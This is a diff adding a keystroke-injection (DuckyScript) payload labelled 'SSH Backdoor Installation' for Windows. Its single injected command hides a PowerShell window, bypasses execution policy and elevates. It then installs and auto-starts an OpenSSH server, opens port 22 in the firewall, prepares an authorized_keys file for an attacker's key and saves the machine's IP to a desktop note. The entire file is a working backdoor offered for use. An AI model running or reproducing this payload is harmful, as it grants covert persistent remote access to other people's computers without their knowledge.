@@ -1,0 +1,13 @@
+REM ============================================
+REM  FU PERSON | SSH Backdoor Installation
+REM  FLLC - by PERSON FU
+REM  Time: ~10 seconds | Stealth: MEDIUM
+REM  Enables OpenSSH, adds authorized key, opens FW
+REM  Requires: Admin
+REM ============================================
+DELAY 500
+GUI r
+DELAY 400
+STRING powershell -w hidden -ep bypass -c "Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-ep bypass -c \"Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 2>$null;Start-Service sshd;Set-Service -Name sshd -StartupType Automatic;netsh advfirewall firewall add rule name=\\\"OpenSSH Server\\\" dir=in action=allow protocol=tcp localport=22;$sshDir=\\\"$env:USERPROFILE\.ssh\\\";md $sshDir -f|Out-Null;$ak=\\\"$sshDir\authorized_keys\\\";if(!(Test-Path $ak)){New-Item $ak -ItemType File -f|Out-Null};$ip=(Get-NetIPAddress -AddressFamily IPv4|?{$_.IPAddress -ne \\\"127.0.0.1\\\"}|select -f 1).IPAddress;\\\"SSH enabled on $ip`:22\\\"|Out-File ([Environment]::GetFolderPath(\\\"Desktop\\\")+\\\"\ssh_ready.txt\\\");\\\"Place your public key in: $ak\\\"|Add-Content ([Environment]::GetFolderPath(\\\"Desktop\\\")+\\\"\ssh_ready.txt\\\")\"'"
+ENTER
+DELAY 500
